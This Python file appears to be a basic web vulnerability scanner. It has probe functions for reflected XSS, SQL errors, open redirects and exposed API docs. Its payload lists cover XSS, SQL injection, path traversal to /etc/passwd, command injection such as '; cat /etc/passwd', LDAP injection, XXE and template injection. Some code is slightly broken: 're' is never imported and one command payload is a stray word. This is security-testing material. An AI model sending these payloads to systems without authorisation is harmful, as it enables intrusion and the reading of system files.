import requests
from bs4 import BeautifulSoup
import html

def scan_reflected_xss(url, param, payload="<script>alert(1)</script>"):
    """Checks if a payload is reflected in the response body."""
    try:
        # Construct URL with payload
        if '?' in url:
            target = f"{url}&{param}={payload}"
        else:
            target = f"{url}?{param}={payload}"

        response = requests.get(target, timeout=5)
        if payload in response.text:
            return f"Potential Reflected XSS found on parameter '{param}'"
        return "Payload not reflected verbatim"
    except Exception as e:
        return str(e)

def scan_sql_error(url, param):
    """Checks for common SQL error messages."""
    payload = "'"
    errors = [
        "SQL syntax",
        "mysql_fetch",
        "ORA-",
        "PostgreSQL query failed"
    ]
    try:
        if '?' in url:
            target = f"{url}&{param}={payload}"
        else:
            target = f"{url}?{param}={payload}"

        response = requests.get(target, timeout=5)
        for err in errors:
            if err in response.text:
                return f"Potential SQL Injection Error detected: {err}"
        return "No common SQL errors detected"
    except Exception as e:
        return str(e)

def scan_open_redirect(url, param, target="http://example.com"):
    try:
        if '?' in url:
            test_url = f"{url}&{param}={target}"
        else:
            test_url = f"{url}?{param}={target}"

        response = requests.get(test_url, allow_redirects=False, timeout=5)
        if response.status_code in [301, 302, 307, 308]:
            loc = response.headers.get('Location', '')
            if target in loc:
                return f"Potential Open Redirect on parameter '{param}'"
        return "No redirect detected"
    except Exception as e:
        return str(e)

def generate_xss_payloads():
    return [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
        "'\"><script>alert(1)</script>"
    ]

def generate_sqli_payloads():
    return [
        "' OR 1=1 --",
        "' OR '1'='1",
        "admin' --",
        "' UNION SELECT 1,2,3 --",
        "sleep(5) --"
    ]

def generate_lfi_payloads():
    return [
        "../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "../../../../windows/win.ini",
        "php://filter/convert.base64-encode/resource=index.php"
    ]

def identify_input_params(url):
    """Extracts input names from forms."""
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        inputs = soup.find_all('input')
        params = [i.get('name') for i in inputs if i.get('name')]
        return list(set(params))
    except Exception as e:
        return str(e)

def check_http_verb_tampering(url):
    """Checks if other verbs are accepted."""
    verbs = ['HEAD', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS']
    results = {}
    try:
        for verb in verbs:
            res = requests.request(verb, url, timeout=5)
            results[verb] = res.status_code
        return results
    except Exception as e:
        return str(e)

def basic_html_encoding(text):
    return html.escape(text)

def basic_html_decoding(text):
    return html.unescape(text)

def check_xml_rpc(url):
    try:
        if not url.endswith('/'): url += '/'
        res = requests.post(url + "xmlrpc.php", data="test", timeout=5)
        if res.status_code == 200 and "XML-RPC server accepts POST requests only" in res.text:
            return "XML-RPC enabled"
        return "XML-RPC likely disabled or not found"
    except:
        return "Error"

def check_local_file_inclusion_heuristic(url, param):
    # Very basic check if page size changes drastically or reflects content
    # Safe check is hard.
    return "Heuristic LFI check requires manual analysis usually."

def detect_base64(text):
    import base64
    try:
        if len(text) % 4 == 0 and re.match('^[A-Za-z0-9+/]+={0,2}$', text):
            base64.b64decode(text, validate=True)
            return True
        return False
    except:
        return False

def check_stack_trace_exposure(text):
    indicators = [
        "Traceback (most recent call last)",
        "System.Exception",
        "at java.lang.Thread.run",
        "Warning: include(",
        "Fatal error:"
    ]
    found = [ind for ind in indicators if ind in text]
    return found if found else "No stack trace indicators found"

def generate_cmd_injection_payloads():
    return [
        "; cat /etc/passwd",
        "| whoami",
        "`whoami`",
        "jules",
        "&& dir"
    ]

def generate_ldap_payloads():
    return [
        "*",
        "*)(uid=*))(|(uid=*",
        "*()|&'",
        "admin*)((|userpassword=*)",
        ")(|(uid=*)"
    ]

def generate_xml_payloads():
    return [
        "<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
        "<foo><![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]></foo>"
    ]

def generate_ssti_payloads():
    return [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "{{''.__class__.__mro__[1].__subclasses__()}}"
    ]

def check_json_response(url):
    try:
        res = requests.get(url, timeout=5)
        res.json()
        return "Returns Valid JSON"
    except:
        return "Not JSON"

def check_api_docs(url):
    paths = ['/swagger.json', '/api/docs', '/docs', '/redoc', '/openapi.json']
    found = []
    if not url.endswith('/'): url += '/'
    for p in paths:
        try:
            res = requests.head(url.rstrip('/') + p, timeout=3)
            if res.status_code == 200:
                found.append(p)
        except:
            pass
    return found if found else "No API docs found"
